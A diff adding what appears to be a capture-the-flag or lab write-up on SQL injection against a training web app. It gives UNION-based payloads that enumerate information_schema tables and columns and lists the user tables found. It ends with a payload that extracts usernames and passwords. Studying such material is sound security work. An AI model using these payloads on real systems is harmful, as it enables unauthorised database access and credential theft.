@@ -1,3 +1,69 @@
+# SQL injection data
+
+## SQL injection commands
+### retrieve tables
+1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables 
+
+### retrieve columns
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+
+### Looking at the data
+Towards the end of each list, we find entries that look different :
+- not written in caps
+- names are not generic
+
+So we can assume they are user-generated. Let's take a closer look at those....
+
+## list of user-generated tables
+Title: db_default
+Url : Member_Brute_Force
+
+Title: users
+Url : Member_Sql_Injection
+
+Title: guestbook
+Url : Member_guestbook
+
+Title: list_images
+Url : Member_images
+
+Title: vote_dbs
+Url : Member_survey
+
+## list of columns
+db_default
+Title: id
+Title: username
+Title: password
+
+users
+Title: user_id
+Title: countersign
+Title: first_name
+Title: last_name
+Title: town
+Title: country
+Title: planet
+Title: Commentaire
+
+guestbook
+Title: id_comment
+Title: comment
+Title: name
+
+list_images
+Title: id
+Title: url
+Title: title
+Title: comment
+
+vote_dbs
+Title: id_vote
+Title: vote
+Title: nb_vote
+Title: subject
+
+
 ## Member_Brute_Force.db_default => 01_login
 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
 ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
